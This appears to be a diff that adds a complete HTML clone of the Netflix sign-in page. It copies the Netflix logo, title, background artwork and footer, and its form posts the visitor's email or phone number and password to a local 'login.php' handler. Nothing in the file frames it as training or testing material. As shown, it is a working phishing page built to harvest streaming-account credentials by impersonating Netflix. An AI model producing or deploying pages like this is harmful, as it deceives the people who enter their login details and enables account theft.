@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Netflix - Log In</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #000;
+            color: #fff;
+        }
+        .header {
+            padding: 20px 40px;
+            background: linear-gradient(to bottom, rgba(0,0,0,0.8) 0%, rgba(0,0,0,0) 100%);
+        }
+        .netflix-logo {
+            height: 45px;
+        }
+        .login-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 90vh;
+            background-image: url('https://assets.nflxext.com/ffe/siteui/vlv3/9c5457b8-9ab0-4a04-9fc1-e608d5670f1a/710d74e0-7158-408e-8d9b-23c219dee5df/US-en-20210719-popsignuptwoweeks-perspective_alpha_website_small.jpg');
+            background-size: cover;
+            background-position: center;
+            position: relative;
+        }
+        .login-container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            right: 0;
+            bottom: 0;
+            left: 0;
+            background: rgba(0, 0, 0, 0.5);
+        }
+        .login-form-container {
+            position: relative;
+            background-color: rgba(0, 0, 0, 0.75);
+            border-radius: 4px;
+            padding: 60px 68px 40px;
+            max-width: 450px;
+            width: 100%;
+            box-sizing: border-box;
+        }
+        .login-form-title {
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 28px;
+        }
+        .login-form {
+            display: flex;
+            flex-direction: column;
+        }
+        .form-group {
+            position: relative;
+            margin-bottom: 16px;
+        }
+        .form-input {
+            width: 100%;
+            height: 50px;
+            background-color: #333;
+            border: none;
+            border-radius: 4px;
+            color: white;
+            padding: 16px 20px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        .form-input::placeholder {
+            color: #8c8c8c;
+        }
+        .form-input:focus {
+            outline: none;
+            background-color: #454545;
+        }
+        .login-button {
+            width: 100%;
+            height: 50px;
+            background-color: #e50914;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 700;
+            margin: 24px 0 12px;
+            cursor: pointer;
+        }
+        .login-button:hover {
+            background-color: #f40612;
+        }
+        .remember-me {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 13px;
+            color: #b3b3b3;
+        }
+        .remember-checkbox {
+            background-color: #737373;
+            border-radius: 2px;
+            border: 0;
+            height: 16px;
+            left: -20px;
+            width: 16px;
+            margin-right: 5px;
+        }
+        .signup-link {
+            color: #b3b3b3;
+            font-size: 16px;
+            margin-top: 16px;
+        }
+        .signup-text {
+            color: #737373;
+        }
+        .signup-now {
+            color: white;
+            text-decoration: none;
+        }
+        .signup-now:hover {
+            text-decoration: underline;
+        }
+        .recaptcha-terms {
+            font-size: 13px;
+            color: #8c8c8c;
+            margin-top: 11px;
+        }
+        .help-link {
+            color: #b3b3b3;
+            text-decoration: none;
+        }
+        .help-link:hover {
+            text-decoration: underline;
+        }
+        .footer {
+            background-color: rgba(0, 0, 0, 0.75);
+            padding: 30px 40px;
+            color: #737373;
+            margin-top: 100px;
+        }
+        .footer-content {
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+        .footer-top {
+            margin-bottom: 30px;
+        }
+        .footer-links {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            grid-gap: 15px;
+            font-size: 13px;
+        }
+        .footer-link {
+            color: #737373;
+            text-decoration: none;
+        }
+        .footer-link:hover {
+            text-decoration: underline;
+        }
+        .language-selector {
+            display: inline-block;
+            position: relative;
+            margin-top: 20px;
+        }
+        .language-select {
+            background-color: #000;
+            color: #737373;
+            padding: 12px 26px 12px 50px;
+            border: 1px solid #333;
+            border-radius: 2px;
+            appearance: none;
+        }
+        .globe-icon {
+            position: absolute;
+            left: 15px;
+            top: 13px;
+            color: #737373;
+        }
+        
+        @media (max-width: 740px) {
+            .login-form-container {
+                padding: 20px 30px;
+                max-width: 100%;
+                margin: 0 20px;
+            }
+            .netflix-logo {
+                height: 24px;
+            }
+            .header {
+                padding: 15px 20px;
+            }
+            .footer-links {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <svg class="netflix-logo" viewBox="0 0 111 30" fill="#e50914">
+            <path d="M105.062 14.28L111 30c-1.75-.25-3.499-.563-5.28-.845l-3.345-8.686-3.437 7.969c-1.687-.282-3.344-.376-5.031-.595l6.031-13.75L94.468 0h5.063l3.062 7.874L105.875 0h5.124l-5.937 14.28zM90.47 0h-4.594v27.25c1.5.094 3.062.156 4.594.343V0zm-8.563 26.937c-4.187-.281-8.375-.53-12.656-.625V0h4.687v21.875c2.688.062 5.375.28 7.969.405v4.657zM64.25 10.657v4.687h-6.406V26H53.22V0h13.125v4.687h-8.5v5.97h6.406zm-18.906-5.97V26.25c-1.563 0-3.156 0-4.688.062V4.687h-4.844V0h14.406v4.687h-4.874zM30.75 15.593c-2.062 0-4.5 0-6.25.095v6.968c2.75-.188 5.5-.406 8.281-.5v4.5l-12.968 1.032V0H32.78v4.687H24.5V11c1.813 0 4.594-.094 6.25-.094v4.688zM4.78 12.968v16.375C3.094 29.531 1.593 29.75 0 30V0h4.469l6.093 17.032V0h4.688v28.062c-1.656.282-3.344.376-5.125.625L4.78 12.968z"/>
+        </svg>
+    </header>
+    
+    <main class="login-container">
+        <div class="login-form-container">
+            <h1 class="login-form-title">Sign In</h1>
+            <form class="login-form" action="login.php" method="post">
+                <div class="form-group">
+                    <input type="text" name="email" class="form-input" placeholder="Email or phone number" required>
+                </div>
+                <div class="form-group">
+                    <input type="password" name="password" class="form-input" placeholder="Password" required>
+                </div>
+                <button type="submit" class="login-button">Sign In</button>
+                
+                <div class="remember-me">
+                    <label>
+                        <input type="checkbox" class="remember-checkbox"> Remember me
+                    </label>
+                    <a href="#" class="help-link">Need help?</a>
+                </div>
+                
+                <div class="signup-link">
+                    <span class="signup-text">New to Netflix?</span> 
+                    <a href="#" class="signup-now">Sign up now</a>
+                </div>
+                
+                <div class="recaptcha-terms">
+                    This page is protected by Google reCAPTCHA to ensure you're not a bot. 
+                    <a href="#" class="help-link">Learn more.</a>
+                </div>
+            </form>
+        </div>
+    </main>
+    
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="footer-top">
+                <a href="#" class="help-link">Questions? Contact us.</a>
+            </div>
+            <div class="footer-links">
+                <a href="#" class="footer-link">FAQ</a>
+                <a href="#" class="footer-link">Help Center</a>
+                <a href="#" class="footer-link">Terms of Use</a>
+                <a href="#" class="footer-link">Privacy</a>
+                <a href="#" class="footer-link">Cookie Preferences</a>
+                <a href="#" class="footer-link">Corporate Information</a>
+            </div>
+            <div class="language-selector">
+                <span class="globe-icon">🌐</span>
+                <select class="language-select">
+                    <option>English</option>
+                    <option>Español</option>
+                </select>
+            </div>
+        </div>
+    </footer>
+</body>
+</html>
